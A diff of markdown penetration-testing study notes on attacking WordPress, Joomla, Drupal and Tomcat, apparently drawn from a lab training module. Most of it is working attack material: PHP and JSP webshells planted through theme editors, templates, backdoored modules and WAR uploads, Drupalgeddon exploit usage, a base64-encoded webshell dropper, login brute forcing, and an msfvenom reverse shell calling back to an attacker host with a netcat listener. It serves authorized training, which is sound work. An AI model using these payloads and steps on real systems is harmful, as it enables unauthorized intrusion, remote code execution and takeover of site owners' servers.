@@ -2,308 +2,277 @@
 
 ## Introduction to Attacking Common Applications
 
-The same applications show up in environment after environment — patched in one, misconfigured or forgotten in the next. Attack two angles: known/public vulns, and abuse of built-in functionality (admin panels, script consoles, task runners) to reach RCE.
-
-App types worth hunting: CMS (WordPress, Joomla, Drupal, DotNetNuke), app servers (Tomcat, WebLogic, WebSphere, JBoss), SIEM (Splunk), network monitoring (PRTG, OpManager, Nagios, Zabbix), IT mgmt (Puppet), ticketing (osTicket, Zendesk), search (Elasticsearch, Solr), code repos/config mgmt (GitLab, GitHub, Bitbucket, JIRA), dev tools (Jenkins, Confluence, phpMyAdmin).
-
-Pattern that pays off with unknown apps: fingerprint → try default creds (e.g. Nexus Repository OSS `admin:admin123`) → abuse admin API or Tasks functionality to run a Groovy script → RCE. OpManager lets you run scripts as the app user, usually `NT AUTHORITY\SYSTEM`.
+Web applications are common across assessments and often vulnerable to OWASP Top 10 issues or abuse of built-in functionality for RCE.
 
 ### Module Targets
 
-Labs simulate a large environment with vhosts on one host — FQDNs only resolve after adding hosts entries:
+Vhosts map to different directories on the same host, so `/etc/hosts` must be edited to reach them by FQDN.
 
 ```bash
 IP=<TARGET_IP>
-printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
+printf "%s\t%s\n\n" "$IP" "<TARGET_DOMAIN>" | sudo tee -a /etc/hosts
 ```
-
-If a spawned target isn't reachable via FQDN, check `/etc/hosts` first and update entries.
 
 ## Application Discovery & Enumeration
 
+Initial web discovery and screenshotting of large scopes to prioritize targets before deep enumeration.
+
 ### Nmap - Web Discovery
 
-Initial sweep of common web ports against the scope list, then screenshot tools, then deeper scans (top 10k or all ports depending on scope size). Enumeration is iterative — re-run the screenshotting tools against every subsequent Nmap scan.
-
 ```bash
-nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
+nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list # common web ports across scope
+nmap --open -sV <TARGET_IP> # service/version scan, default top 1000 ports
 ```
-
-### Initial Enumeration
-
-```bash
-sudo nmap --open -sV <TARGET_IP>
-```
-
-Service banners identify the apps — e.g. `Splunkd httpd` on 8000/8089, `Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)` on 8080, `Indy httpd` + Apache Tomcat on 8080. Ports 135/139/445/3389 alongside → Windows host.
-
-Hostnames matter: `dev` in the FQDN → possibly untested features, debug mode enabled. A `gitlab-dev` host goes on the interesting list — public repos may hold credentials or clues to other vhosts, and GitLab instances often allow self-registration without admin approval. Old commits are worth checking for creds.
 
 ### Using EyeWitness
 
-`sudo apt install eyewitness` (or clone + setup.sh, Docker, or Windows build). Takes Nmap/Nessus XML, screenshots every web app with Selenium, categorizes and fingerprints apps where possible, and suggests default credentials.
+Takes Nmap/Nessus XML, screenshots web apps, categorizes and fingerprints them, suggests default creds.
 
 ```bash
-eyewitness --web -x web_discovery.xml -d <output_dir>
+sudo apt install eyewitness
+eyewitness --web -x web_discovery.xml -d <OUTPUT_FILE>
 ```
 
 ### Using Aquatone
 
-Same idea — takes a .txt host list or Nmap/Masscan XML via `-nmap`:
+Takes Nmap/Masscan XML, screenshots web apps and clusters similar pages into an HTML report.
 
 ```bash
-cat web_discovery.xml | aquatone -nmap
+wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
+unzip aquatone_linux_amd64_1.7.0.zip
+cat web_discovery.xml | ./aquatone -nmap
 ```
 
 ### Interpreting the Results
 
-Review the entire report before attacking anything — interesting hosts get buried deep in large reports (OpManager with `admin:admin` was found hundreds of pages into one external report, running as a Domain Admin → full compromise). Note URL + app name/version for every interesting host.
-
-- Tomcat anywhere (especially external) → default creds on `/manager` and `/host-manager` → WAR upload → JSP RCE.
-- Custom web apps → always test; also check whether a CMS (WordPress/Joomla/Drupal) runs underneath.
-- Support portals (osTicket etc.) → possible sensitive data, or harvest a valid company email for signups elsewhere.
-- Internal-only finds: printer login pages (sometimes leak cleartext LDAP creds), ESXi/vCenter, iLO/iDRAC, network/IoT devices, IP phones, internal code repos, SharePoint/intranet portals.
-- Externals typically mix custom apps, CMS, Tomcat/Jenkins/Splunk, RDS portals, SSL VPN, OWA/O365, edge device logins.
+Tomcat found in results: try default creds on `/manager` and `/host-manager`, upload a malicious WAR for RCE via JSP.
 
 ## WordPress - Discovery & Enumeration
 
+Open-source PHP CMS, usually Apache + MySQL backend. Highly extensible via themes/plugins, which are the main vuln source.
+
 ### Discovery/Footprinting
 
-`/robots.txt` referencing `/wp-admin/` or `/wp-content/` is a dead giveaway. `/wp-admin` redirects to `/wp-login.php`, the back-end login. Plugins live in `wp-content/plugins`, themes in `wp-content/themes` — enumerate both carefully. Administrator access is usually enough for code execution; editors/authors may reach vulnerable plugins that normal users can't.
+`/robots.txt` referencing `/wp-admin` and `/wp-content` indicates WordPress. `/wp-admin` redirects to `/wp-login.php` (login page). Plugins live in `wp-content/plugins`, themes in `wp-content/themes`.
+
+`Administrator` full control incl. editing code | `Editor` publish/manage all posts | `Author` publish/manage own posts | `Contributor` write/manage own posts, can't publish | `Subscriber` browse posts, edit own profile
+
+### Enumeration
 
 ```bash
-curl -s http://<TARGET_DOMAIN> | grep WordPress     # <meta name="generator" content="WordPress 5.8">
-curl -s http://<TARGET_DOMAIN>/ | grep themes       # theme name in css path
-curl -s http://<TARGET_DOMAIN>/ | grep plugins      # installed plugins + versions
-curl -s "http://<TARGET_DOMAIN>/?p=1" | grep plugins  # more plugins visible on post pages
+curl -s http://<TARGET_DOMAIN> | grep WordPress # confirm WP + version via generator meta tag
+curl -s http://<TARGET_DOMAIN>/ | grep themes # identify theme
+curl -s http://<TARGET_DOMAIN>/ | grep plugins # identify plugins
 ```
 
-Browse plugin directories directly — directory listing + `readme.txt` files often fingerprint exact versions. Module example: mail-masta 1.0.0 (unauth LFI), wpDiscuz 7.0.4 (unauth RCE). Note versions, then research — but don't start exploiting the first flaw found; keep enumerating so nothing is missed.
+Plugin/theme directories often have directory listing enabled with a `readme.txt` revealing the version.
 
-### Enumerating Users
+#### Enumerating Users
 
-`/wp-login.php` error messages differ:
+`/wp-login.php` with a valid username and wrong password returns "password is incorrect"; an invalid username returns "not registered". Confirms valid usernames.
 
-- valid user + wrong password → "The password for username X is incorrect."
-- invalid username → "The username X is not registered on this site."
+#### WPScan
 
-Straightforward username enumeration. The module example confirmed `admin`.
-
-### WPScan
+Automated WordPress scanner for outdated/vulnerable themes, plugins, users. Installed by default on Parrot OS.
 
 ```bash
-wpscan --url http://<TARGET_DOMAIN> --enumerate --api-token <TOKEN>   # free token from WPVulnDB
-wpscan --url http://<TARGET_DOMAIN> --enumerate ap                    # all plugins, not just vulnerable ones
+sudo gem install wpscan
+sudo wpscan --url http://<TARGET_DOMAIN> --enumerate --api-token <TOKEN> # default enumerates vulnerable plugins/themes/users/media/backups
 ```
 
-Default 5 threads, adjust with `-t`. Combines passive + aggressive detection; reports core/theme/plugin versions, known vulns with PoC links, and users (author id brute forcing + login error messages).
+`--enumerate ap` all plugins | `-t` thread count, default 5 | `--api-token` WPVulnDB token for vuln data
 
-Caveats from the module run: it corrected the manually-identified theme (Transport Gravity is a child theme of Business Gravity), found an extra user (`john`) — but missed wpDiscuz and Contact Form 7 entirely. Manual + automated together, always.
-
-Findings worth flagging from a scan: XML-RPC enabled (`/xmlrpc.php`) → brute-force avenue; directory listing enabled on `/wp-content/uploads/` and theme dirs; `readme.html` present.
+XML-RPC enabled at `/xmlrpc.php` can be used for password brute-forcing.
 
 ## Attacking WordPress
 
+Abuse built-in functionality (theme editor) or known plugin vulnerabilities after obtaining admin or plugin-level access.
+
 ### Login Bruteforce
 
-WPScan does both `wp-login` (standard login page) and `xmlrpc` (login attempts via the `/xmlrpc.php` API — faster, preferred):
+WPScan brute forces via `xmlrpc` (faster, via API) or `wp-login` (standard login page).
 
 ```bash
-wpscan --password-attack xmlrpc -t 20 -U john -P rockyou.txt --url http://<TARGET_DOMAIN>
+sudo wpscan --password-attack xmlrpc -t 20 -U <USERNAME> -P rockyou.txt --url http://<TARGET_DOMAIN>
 ```
 
-Module example: `john:firebird1`.
+`--password-attack` xmlrpc or wp-login | `-U` user/userlist | `-P` password list | `-t` threads
 
 ### Code Execution
 
-Admin access → edit PHP source directly. Appearance → Theme Editor → select an **inactive** theme (e.g. Twenty Nineteen, to avoid corrupting the active one) → edit `404.php` → add one line just below the comments:
+Admin access lets PHP source be edited via Appearance > Theme Editor. Edit an inactive theme to avoid corrupting the live site.
 
 ```php
 system($_GET[0]);
 ```
 
-Update File, then:
+```bash
+curl http://<TARGET_DOMAIN>/wp-content/themes/<THEME>/404.php?0=id
+```
+
+Metasploit `exploit/unix/webapp/wp_admin_shell_upload` uploads a malicious plugin and runs a PHP Meterpreter shell.
 
 ```bash
-curl http://<TARGET_DOMAIN>/wp-content/themes/twentynineteen/404.php?0=id
+msf6 > use exploit/unix/webapp/wp_admin_shell_upload
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username <USERNAME>
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password <PASSWORD>
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost <ATTACKER_IP>
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost <TARGET_IP>
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST <TARGET_DOMAIN>
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
 ```
 
-Metasploit alternative — uploads a malicious plugin and fires a PHP Meterpreter:
+Must set both VHOST and RHOSTS or the module fails with "target does not appear to be using WordPress".
 
-```
-use exploit/unix/webapp/wp_admin_shell_upload
-set username john
-set password firebird1
-set lhost <ATTACKER_IP>
-set rhost <TARGET_IP>
-set VHOST <TARGET_DOMAIN>
-```
+Report appendix should list:
 
-Both RHOST **and** VHOST must be set, or the exploit aborts with "The target does not appear to be using WordPress".
+- Exploited systems (hostname/IP, method of exploitation)
+- Compromised users (account name, method of compromise, account type)
+- Artifacts created on systems
+- Changes made (e.g. new admin user, group membership)
 
 ### Leveraging Known Vulnerabilities
 
-Most WordPress vulns live in plugins (of ~23,600 in the WPScan DB at time of writing: 89% plugins, 4% core, 7% themes). Use `waybackurls` to find old versions of the site — plugins "removed" but not properly deleted may still be reachable and exploitable.
+`waybackurls` can reveal old/forgotten plugins via the Wayback Machine that may still be accessible and vulnerable even if unlinked.
 
-**mail-masta (unsupported, ≤1.0)** — the `pl` parameter does `include($_GET['pl'])` with no validation:
+#### Vulnerable Plugins - mail-masta
+
+Unauthenticated LFI via the `pl` GET parameter (no input validation), plus SQL injection.
 
 ```bash
 curl -s http://<TARGET_DOMAIN>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 ```
 
-Also unauthenticated SQL injection in the same plugin.
+#### Vulnerable Plugins - wpDiscuz
 
-**wpDiscuz 7.0.4 (CVE-2020-24186)** — file upload bypass of the image-only mime check → PHP webshell, unauthenticated:
+CVE-2020-24186: file mime-type bypass allows unauthenticated PHP file upload for RCE (v7.0.4).
 
 ```bash
 python3 wp_discuz.py -u http://<TARGET_DOMAIN> -p /?p=1
 ```
 
-The script's built-in command execution may fail, but the webshell is uploaded — the exploit prints the random upload path; run commands through it:
+`-u` target URL | `-p` path to a valid post
 
-```bash
-curl -s http://<TARGET_DOMAIN>/wp-content/uploads/2021/08/<webshell>.php?cmd=id
-```
+If the exploit doesn't return command output directly, append `?cmd=` to the uploaded `.php` shell path and use cURL to run commands.
 
 ## Joomla - Discovery & Enumeration
+
+Open-source PHP CMS, usually MySQL (or PostgreSQL/SQLite) backend. Extensible via extensions/templates.
 
 ### Discovery/Footprinting
 
 ```bash
-curl -s http://<TARGET_DOMAIN>/ | grep Joomla                  # <meta name="generator" content="Joomla! - Open Source Content Management">
-curl -s http://<TARGET_DOMAIN>/README.txt | head -n 5          # "Joomla! installation/upgrade package to version 3.x"
+curl -s http://<TARGET_DOMAIN>/ | grep Joomla # generator meta tag
+curl -s http://<TARGET_DOMAIN>/README.txt | head -n 5 # version info
+curl -s http://<TARGET_DOMAIN>/administrator/manifests/files/joomla.xml | xmllint --format - # version info
 ```
 
-robots.txt typical for Joomla: `Disallow: /administrator/`, `/bin/`, `/cache/`, `/cli/`, `/components/`, `/includes/`, `/installation/`, `/language/`, `/layouts/`, `/libraries/`, `/logs/`, `/modules/`, `/plugins/`, `/tmp/`. Also look for the Joomla favicon, and version in JS files under `media/system/js/`.
-
-Exact version:
-
-```bash
-curl -s http://<TARGET_DOMAIN>/administrator/manifests/files/joomla.xml | xmllint --format -
-# <version>3.9.4</version>
-```
-
-`plugins/system/cache/cache.xml` gives an approximate version.
+`robots.txt` disallowing `/administrator/`, `/components/`, `/modules/` etc. indicates Joomla. Version can also be approximated via `plugins/system/cache/cache.xml`.
 
 ### Enumeration
 
-droopescan (works for Joomla but limited):
+Admin login at `/administrator/index.php`. Default user `admin`, password set at install time.
 
 ```bash
+sudo pip3 install droopescan
 droopescan scan joomla --url http://<TARGET_DOMAIN>/
 ```
 
-Returns possible versions plus interesting URLs (joomla.xml, login page at `/administrator/`, cache.xml).
-
-JoomlaScan (Python2, needs `python2 -m pip install bs4`) — finds components, explorable directories, and XML files, helpful for fingerprinting installed extensions:
+JoomlaScan (Python2, needs `bs4`) finds accessible components/directories and helps fingerprint extensions.
 
 ```bash
+python2 -m pip install bs4
 python2 joomlascan.py -u http://<TARGET_DOMAIN>
 ```
 
-Login portal: `/administrator/index.php`. No user enumeration — generic "Username and password do not match or you do not have an account yet." The default admin account is `admin`, but the password is set at install time, so it's guesswork or light brute forcing:
-
 ```bash
-python3 joomla-brute.py -u http://<TARGET_DOMAIN> -w http_default_pass.txt -usr admin
+sudo python3 joomla-brute.py -u http://<TARGET_DOMAIN> -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 ```
-
-Module example: `admin:admin`.
 
 ## Attacking Joomla
 
+Gain RCE via admin-authenticated template editing, similar to WordPress theme editing.
+
+Gotcha: "Call to a member function format() on null" error after login, disable the "Quick Icon - PHP Version Check" plugin via `/administrator/index.php?option=com_plugins`.
+
 ### Abusing Built-In Functionality
 
-Log in to `/administrator`, then Templates (bottom left, under Configuration) → click a template name (e.g. **protostar**) → Templates: Customise → pick a page (e.g. `error.php`) → add a PHP one-liner:
+Configuration > Templates > select a template > Customise > edit an uncommon page (e.g. `error.php`), add a PHP one-liner using a non-obvious parameter name.
 
 ```php
-system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+system($_GET['<PARAM>']);
 ```
-
-Save & Close, confirm:
 
 ```bash
-curl -s http://<TARGET_DOMAIN>/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
+curl -s http://<TARGET_DOMAIN>/templates/<TEMPLATE>/error.php?<PARAM>=id
 ```
-
-Habit-forming detail: use non-standard parameter names (an md5 hash works) so a drive-by attacker can't stumble onto your shell. Clean up afterwards and note the file in the report.
-
-If the control panel errors with "Call to a member function format() on null" after login: browse to `index.php?option=com_plugins` and disable the "Quick Icon - PHP Version Check" plugin.
 
 ### Leveraging Known Vulnerabilities
 
-**CVE-2019-10945** — directory traversal + authenticated arbitrary file deletion, Joomla 1.5.0 through 3.9.4. Only useful when the admin portal isn't reachable from outside (with admin creds, template editing gives RCE directly). The script lists directory contents — traversal may reach sensitive files like `configuration.php`:
+CVE-2019-10945: directory traversal and authenticated arbitrary file deletion, Joomla 1.5.0–3.9.4. Only useful for reading files if admin creds are known but the admin panel isn't reachable; with panel access, template RCE is faster.
 
 ```bash
-python2.7 joomla_dir_trav.py --url "http://<TARGET_DOMAIN>/administrator/" --username admin --password admin --dir /
+python2.7 joomla_dir_trav.py --url "http://<TARGET_DOMAIN>/administrator/" --username <USERNAME> --password <PASSWORD> --dir /
 ```
 
 ## Drupal - Discovery & Enumeration
 
+Open-source PHP CMS, MySQL/PostgreSQL/SQLite backend. Extensible via modules/themes.
+
 ### Discovery/Footprinting
 
-"Powered by Drupal" header/footer, the Drupal logo, `CHANGELOG.txt`/`README.txt`, page source, robots.txt references to `/node`. Drupal indexes content as nodes — URIs of the form `/node/<nodeid>`, useful for identification when a custom theme is in use. Not every install shows or even allows reaching the login page.
-
 ```bash
-curl -s http://<TARGET_DOMAIN> | grep Drupal
-# <meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
+curl -s http://<TARGET_DOMAIN> | grep Drupal # "Powered by Drupal" / generator meta tag
+curl -s http://<TARGET_DOMAIN>/CHANGELOG.txt | grep -m2 "" # version, first 2 lines
 ```
 
-Default user types: Administrator (complete control), Authenticated (add/edit content per permissions), Anonymous (read only).
+Content is indexed via nodes (`/node/<ID>`), a good Drupal indicator with custom themes. Newer installs block `CHANGELOG.txt`/`README.txt` by default.
+
+`Administrator` full control | `Authenticated User` can add/edit per permissions | `Anonymous` read-only by default
 
 ### Enumeration
-
-```bash
-curl -s http://<TARGET_DOMAIN>/CHANGELOG.txt | grep -m2 ""
-# Drupal 7.57, 2018-02-21
-```
-
-Newer installs return 404 on CHANGELOG.txt (blocked by default) — fall back to scanning:
 
 ```bash
 droopescan scan drupal -u http://<TARGET_DOMAIN>
 ```
 
-Much stronger Drupal support than Joomla: plugins found (e.g. `modules/php/` — the PHP module present), possible versions, default admin at `/user/login`.
-
-Version drives the next move: the module's 8.9.1 had no obvious core vulns → pivot to installed plugins or built-in functionality abuse.
-
 ## Attacking Drupal
 
-Getting a shell from the Drupal admin console is not as simple as editing a theme file like WordPress/Joomla.
+Drupal blocks direct theme/plugin PHP edits by default. RCE needs the PHP filter module, a backdoored module upload, or a core CVE.
 
 ### Leveraging the PHP Filter Module
 
-**Drupal 7 (pre-8):** log in as admin → Modules → enable **PHP filter** ("Allows embedded PHP code/snippets to be evaluated") → Save. Content → Add content → Basic page → insert the snippet and set the Text format dropdown to **PHP code** → save:
+Pre-v8: admin enables the PHP filter module, then Content > Add content > Basic page, sets Text format to "PHP code".
 
 ```php
 <?php
-system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+system($_GET['<PARAM>']);
 ?>
 ```
 
 ```bash
-curl -s "http://<TARGET_DOMAIN>/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id" | grep uid | cut -f4 -d">"
+curl -s http://<TARGET_DOMAIN>/node/<NODE_ID>?<PARAM>=id | grep uid | cut -f4 -d">"
 ```
 
-**Drupal 8+:** PHP filter is not installed by default — download and install it yourself (check with the client first, you're changing their instance):
+v8+: module not installed by default, must be downloaded and installed manually (confirm with the client first, since this modifies their instance).
 
 ```bash
 wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
 ```
 
-Administration → Reports → Available updates (or the Extend menu, depending on version) → Browse → Install. Then same Basic page flow as above.
+Install via Administration > Reports > Available updates (or Extend menu) > install from uploaded archive, then create a Basic page as above.
 
 ### Uploading a Backdoored Module
 
-Take a legitimate module (e.g. CAPTCHA), add a shell plus a `.htaccess` (Drupal denies direct access to `/modules`), repackage, install:
+Drupal denies direct access to `/modules`. A `.htaccess` re-enables access for the uploaded module folder.
 
 ```php
 <?php
-system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
+system($_GET['<PARAM>']);
 ?>
 ```
 
-```apache
+```html
 <IfModule mod_rewrite.c>
 RewriteEngine On
 RewriteBase /
@@ -317,109 +286,102 @@ mv shell.php .htaccess captcha
 tar cvf captcha.tar.gz captcha/
 ```
 
-Manage → Extend → + Install new module → upload the archive → after install:
+Install via Extend > Install new module > browse to the archive > Install, then:
 
 ```bash
-curl -s http://<TARGET_DOMAIN>/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+curl -s <TARGET_DOMAIN>/modules/captcha/shell.php?<PARAM>=id
 ```
 
 ### Leveraging Known Vulnerabilities
 
-The three Drupalgeddons:
+Three "Drupalgeddon" core RCE/SQLi flaws:
 
-- **CVE-2014-3704 (Drupalgeddon):** 7.0–7.31, fixed in 7.32. Pre-auth SQLi → upload a malicious form or create a new admin user.
-- **CVE-2018-7600 (Drupalgeddon2):** prior to 7.58 and 8.5.1. RCE via insufficient input sanitization during user registration.
-- **CVE-2018-7602 (Drupalgeddon3):** multiple Drupal 7.x/8.x. Authenticated RCE via improper Form API validation; requires a user who can delete a node.
+`CVE-2014-3704` Drupalgeddon, pre-auth SQLi, 7.0–7.31, fixed 7.32, creates an admin user or uploads malicious code | `CVE-2018-7600` Drupalgeddon2, RCE, <7.58 and <8.5.1, insufficient sanitization during user registration | `CVE-2018-7602` Drupalgeddon3, authenticated RCE via Form API, needs node-delete permission
 
 #### Drupalgeddon
 
-PoC adds an admin account, then RCE via the PHP filter route above:
-
 ```bash
-python2.7 drupalgeddon.py -t http://<TARGET_DOMAIN> -u hacker -p pwnd
+python2.7 drupalgeddon.py -t http://<TARGET_DOMAIN> -u <USERNAME> -p <PASSWORD> # creates new admin user
 ```
 
-Metasploit equivalent: `exploit/multi/http/drupal_drupageddon`.
+Can also use Metasploit `exploit/multi/http/drupal_drupageddon`.
 
 #### Drupalgeddon2
 
-PoC (a2u/CVE-2018-7600) prompts for the target URL and uploads a proof file (`hello.txt`). For a shell, replace the script's `echo` command with one that writes a webshell:
-
 ```bash
-echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
-echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
+python3 drupalgeddon2.py # interactive, prompts for target URL, writes a test file to confirm
 ```
 
-Run the modified script against the target, then:
+Modify the script's `echo` to write a PHP payload instead of the test file.
+
+```php
+<?php system($_GET[<PARAM>]);?>
+```
 
 ```bash
-curl http://<TARGET_DOMAIN>/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+echo '<?php system($_GET[<PARAM>]);?>' | base64
+echo "<BASE64_PAYLOAD>" | base64 -d | tee <FILE>.php # replace the script's echo command with this
+curl http://<TARGET_DOMAIN>/<FILE>.php?<PARAM>=id
 ```
 
 #### Drupalgeddon3
 
-Metasploit `multi/http/drupal_drupageddon3`. Log in first and grab a valid session cookie from the browser, then:
+Authenticated RCE via Form API, requires a valid session cookie and node-delete permission.
 
-```
-set rhosts <TARGET_IP>
-set VHOST <TARGET_DOMAIN>
-set drupal_session <SESSION_COOKIE>
-set DRUPAL_NODE 1
-set LHOST <ATTACKER_IP>
+```bash
+msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts <TARGET_IP>
+msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST <TARGET_DOMAIN>
+msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session <SESSION_COOKIE>
+msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE <NODE_ID>
+msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST <ATTACKER_IP>
+msf6 exploit(multi/http/drupal_drupageddon3) > exploit
 ```
 
 ## Tomcat - Discovery & Enumeration
 
-Tomcat usually sits at the top of "High Value Targets" in an EyeWitness report. More common internally, but an excellent external foothold when found.
+Open-source Java servlet/JSP web server. Common default creds and manager app access lead to RCE.
 
 ### Discovery/Footprinting
 
-The `Server` header leaks Tomcat + version — request an invalid page (works even behind a reverse proxy). Custom error pages may hide it; the default `/docs` page then gives it away (`Apache Tomcat 9 (9.0.30)` in the title) and is rarely removed.
+Server header or an invalid-page 404 response leaks version. `/docs` default docs page also leaks the version if custom error pages are used.
 
-Structure worth knowing:
+```bash
+curl -s http://<TARGET_DOMAIN>:<PORT>/docs/ | grep Tomcat
+```
 
-- `conf/tomcat-users.xml` — credentials + roles governing `/manager` and `/host-manager`
-- `webapps/` — default webroot
-- each app: `WEB-INF/web.xml` (deployment descriptor — routes and the classes handling them), `WEB-INF/classes` (compiled classes, business logic, possible sensitive info), `WEB-INF/lib`, JSP files
+Key paths: `conf/tomcat-users.xml` (manager creds/roles), `webapps/` (webroot, one folder per app), `WEB-INF/web.xml` (deployment descriptor, maps URL routes to servlet classes, may leak data via LFI), `WEB-INF/classes` (compiled classes, may hold business logic/secrets), `WEB-INF/lib` (app libraries).
 
-`web.xml` maps servlets to classes — e.g. `com.inlanefreight.api.AdminServlet` → `classes/com/inlanefreight/api/AdminServlet.class`. Prime target when you have an LFI.
-
-Built-in manager roles from tomcat-users.xml:
-
-- `manager-gui` — HTML GUI + status pages
-- `manager-script` — HTTP API + status pages
-- `manager-jmx` — JMX proxy + status pages
-- `manager-status` — status pages only
-
-Example entries: `tomcat:tomcat` (manager-gui), `admin:admin` (manager-gui, admin-gui).
+`manager-gui` HTML GUI + status pages | `manager-script` HTTP API + status pages | `manager-jmx` JMX proxy + status pages | `manager-status` status pages only
 
 ### Enumeration
 
-Hunt for `/manager` and `/host-manager` — Gobuster or browse directly:
-
 ```bash
-gobuster dir -u http://<TARGET_DOMAIN>:8180/ -w directory-list-2.3-small.txt
+gobuster dir -u http://<TARGET_DOMAIN>:<PORT>/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt # find /manager, /host-manager
 ```
 
-Try weak credentials first (tomcat:tomcat, admin:admin...). Manager access → WAR upload → JSP webshell → RCE. If defaults fail, brute force (next section).
+Weak/default creds on `/manager` or `/host-manager` (e.g. `tomcat:tomcat`, `admin:admin`) allow uploading a WAR file containing a JSP web shell for RCE.
 
 ## Attacking Tomcat
 
+Brute force manager credentials, then upload a WAR web shell for RCE. Also check for Ghostcat (CVE-2020-1938).
+
 ### Tomcat Manager - Login Brute Force
 
+```bash
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST <TARGET_DOMAIN>
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT <PORT>
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts <TARGET_IP>
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
 ```
-use auxiliary/scanner/http/tomcat_mgr_login
-set VHOST <TARGET_DOMAIN>
-set RPORT 8180
-set stop_on_success true
-set rhosts <TARGET_IP>
+
+Default wordlists: `tomcat_mgr_default_pass.txt`, `tomcat_mgr_default_users.txt`, `tomcat_mgr_default_userpass.txt`. Debug via Burp with `set PROXIES HTTP:127.0.0.1:8080`.
+
+```bash
+echo <BASE64> | base64 -d # decode captured Basic Auth header to verify creds tried
 ```
 
-Default wordlists: `tomcat_mgr_default_users.txt`, `tomcat_mgr_default_pass.txt`, `tomcat_mgr_default_userpass.txt`. Module example hit: `tomcat:admin`.
-
-Debugging a misbehaving module through Burp — `set PROXIES HTTP:127.0.0.1:8080` — shows each attempt base64-encoded in the Authorization header, exactly as Tomcat basic auth expects.
-
-The module's standalone Python brute-forcer (mgr_brute.py):
+Python brute force alternative:
 
 ```python
 #!/usr/bin/python
@@ -467,69 +429,105 @@ if r.status_code != 200:
 ```
 
 ```bash
-python3 mgr_brute.py -U http://<TARGET_DOMAIN>:8180/ -P /manager -u tomcat_mgr_default_users.txt -p tomcat_mgr_default_pass.txt
+python3 mgr_brute.py -U http://<TARGET_DOMAIN>:<PORT>/ -P /manager -u tomcat_mgr_default_users.txt -p tomcat_mgr_default_pass.txt
 ```
 
 ### Tomcat Manager - WAR File Upload
 
-`/manager/html` (manager-gui role) deploys WAR files instantly. Package a JSP web shell:
+`/manager/html` (default) lets `manager-gui` users deploy WAR files for instant RCE.
+
+```java
+<%@ page import="java.util.*,java.io.*"%>
+<%
+//
+// JSP_KIT
+//
+// cmd.jsp = Command Execution (unix)
+//
+// by: Unknown
+// modified: 27/06/2003
+//
+%>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>
+```
 
 ```bash
 wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
 zip -r backup.war cmd.jsp
 ```
 
-Manager GUI → Browse → select the .war → Deploy. The `/backup` app appears in the table; hit the shell at:
+Deploy via manager GUI (Browse > Deploy). Browse to `/<APP>/cmd.jsp` after (the app root alone 404s).
 
 ```bash
-curl http://<TARGET_DOMAIN>:8180/backup/cmd.jsp?cmd=id
+curl http://<TARGET_DOMAIN>:<PORT>/backup/cmd.jsp?cmd=id
 ```
 
-Cleanup: Undeploy from the manager page (removes the WAR and the extracted directory); note the upload location (e.g. `/opt/tomcat/apache-tomcat-10.0.10/webapps`) for the report.
+Undeploy via manager GUI to remove the WAR and its extracted directory (default webroot e.g. `/opt/tomcat/apache-tomcat-<VERSION>/webapps`).
 
-Or skip the GUI shell and generate a reverse shell WAR:
+msfvenom WAR payload (auto-extracted and runs on deploy):
 
 ```bash
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4443 -f war > backup.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war > backup.war
+nc -lnvp <PORT>
 ```
 
-Deploy, start `nc -lnvp 4443`, browse to the app. `multi/http/tomcat_mgr_upload` automates the whole process.
